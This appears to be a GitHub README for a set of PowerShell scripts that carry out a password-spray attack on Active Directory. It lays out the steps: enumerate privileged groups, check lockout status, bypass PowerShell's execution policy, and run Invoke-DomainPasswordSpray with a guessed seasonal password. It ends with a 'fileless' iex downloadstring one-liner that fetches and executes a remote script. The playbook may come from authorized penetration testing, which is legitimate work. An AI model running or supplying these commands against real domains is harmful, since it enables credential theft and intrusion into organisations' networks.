# AD
Queries and code related to Active Directory

Process: 
1. Use the "ADCounts.ps1" script to size up the directory.
2. Use a command like "Net accounts /domain" to see the current password policy (Don't want to lock thouse accounts, eh?)
3. Use GetADPrivGroups.ps1 to get membership in the main AD Elevated groups - see who is who.
4. Could go and get Blood Hound / SharpHound, maybe collect some juicy details... 
5. Assess the current situation before the sparay - try getlockoutinfo.ps1 for details and getlocked.ps1 for lockout status.
6. Then attempt the PW spray with pwspray.ps1

6. A. Need to open up a PowerShell prompt w/ bypass: from command prompt, "PowerShell -exec bypass" should get you there.
6. B. Need to import the script - Type 'Import-Module pwspray.ps1', which is a more paranoid version of dafthack's pw spray script.
6. C. Run the script - Invoke-DomainPasswordSpray -Password Summer2020 -OutFile results.txt
6. D. Observe - Search-ADAccount –LockedOut. Problems? Use control C and punt. Wait a bunch before you try again. 

7. Kick it up a notch maybe? Go fileless?
powershell -nop -c "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/OnlyTheShadowKnows/AD/master/ADcounts.ps1')"



